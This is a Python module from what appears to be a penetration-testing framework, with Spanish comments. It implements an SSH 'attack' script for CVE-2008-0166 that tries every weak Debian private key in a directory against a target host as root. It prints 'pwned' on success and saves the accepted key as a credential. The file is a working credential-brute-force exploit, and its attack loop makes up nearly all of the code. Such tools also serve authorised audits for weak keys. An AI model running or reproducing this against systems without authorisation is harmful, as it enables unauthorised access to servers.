# scripts/ssh/attack/known_keys.py
# CVE-2008-0166
import os
import paramiko
from scripts.base import BaseScript
from core.output import print_result, print_check, console
from core import session_db

class Script(BaseScript):
    name        = "known-keys"
    protocol    = "ssh"
    category    = "attack"
    description = "CVE-2008-0166: prueba claves SSH Debian débiles (OpenSSL PRNG roto)."

    EXAMPLES = [
        {"flag": "--keys-dir", "desc": "Directorio con claves débiles conocidas",
         "good": "ssh --script=known-keys -t 10.10.10.5 -u root --keys-dir /opt/ssh-badkeys/",
         "bad":  "ssh --script=known-keys -t 10.10.10.5 (sin keys-dir no hay claves que probar)"},
    ]

    def run(self, **kwargs):
        port     = int(kwargs.get("port") or 22)
        timeout  = int(kwargs.get("timeout") or self.target.timeout or 5)
        username = self.creds.user or "root"
        keys_dir = kwargs.get("keys_dir")
        ip       = self.target.ip

        if not keys_dir or not os.path.isdir(keys_dir):
            console.print("[yellow]Falta --keys-dir con claves débiles.[/yellow]")
            console.print("[dim]Descarga: https://github.com/rapid7/ssh-badkeys[/dim]")
            return None

        key_files = sorted([
            os.path.join(keys_dir, f)
            for f in os.listdir(keys_dir)
            if os.path.isfile(os.path.join(keys_dir, f))
        ])

        print_result("SSH", ip, "info",
                     f"known-keys: {len(key_files)} clave(s) a probar para '{username}'")

        valid = []
        for kp in key_files:
            key = None
            for cls in (paramiko.RSAKey, paramiko.DSAKey,
                        paramiko.ECDSAKey, paramiko.Ed25519Key):
                try:
                    key = cls.from_private_key_file(kp); break
                except Exception:
                    continue
            if key is None:
                continue
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=username, pkey=key,
                               timeout=timeout, allow_agent=False, look_for_keys=False)
                client.close()
                print_result("SSH", ip, "pwned",
                             f"CLAVE DÉBIL VÁLIDA: {os.path.basename(kp)}")
                session_db.save_credential(ip, username, kp, "weak_key",
                                           valid=True, source="ssh_known_keys")
                session_db.save_finding(ip, "SSH", "debian_weak_key", kp)
                valid.append(kp)
            except paramiko.AuthenticationException:
                pass
            except Exception:
                pass

        if valid:
            print_result("SSH", ip, "pwned",
                         f"known-keys: {len(valid)} clave(s) débil(es) aceptada(s)")
        else:
            print_check("No vulnerable a CVE-2008-0166", ok=True)

        return valid
